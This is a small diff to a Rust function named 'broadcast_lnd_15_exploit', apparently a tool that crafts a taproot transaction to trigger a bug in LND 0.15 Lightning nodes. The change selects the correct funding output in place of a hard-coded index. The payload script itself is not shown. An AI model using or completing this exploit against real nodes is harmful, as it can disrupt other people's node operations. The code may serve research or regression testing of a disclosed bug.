@@ -281,6 +281,12 @@ pub fn broadcast_lnd_15_exploit(
         None,
     )?;
 
+    // find which output was used to fund the address
+    let get_tx_out_result = bitcoind_client.get_tx_out(&txid, 0, Some(true))?;
+    let is_vout_0_opt = get_tx_out_result.map(|r| r.script_pub_key.hex == tr_script.serialize());
+    let is_vout_0 = is_vout_0_opt.unwrap_or(false);
+    let vout = if is_vout_0 { 0 } else { 1 };
+
     // create taproot tree
     let tr = TaprootBuilder::new().add_leaf(0, script.clone()).unwrap();
     let spend_info = tr.finalize(&secp, internal_key).unwrap();
@@ -292,7 +298,7 @@ pub fn broadcast_lnd_15_exploit(
     let witness = vec![script.serialize(), control_block.serialize()];
 
     let txin = TxIn {
-        previous_output: OutPoint { txid, vout: 0 }, // TODO find correct output
+        previous_output: OutPoint { txid, vout },
         script_sig: Script::new(),
         sequence: Sequence::ZERO,
         witness: Witness::from_vec(witness),
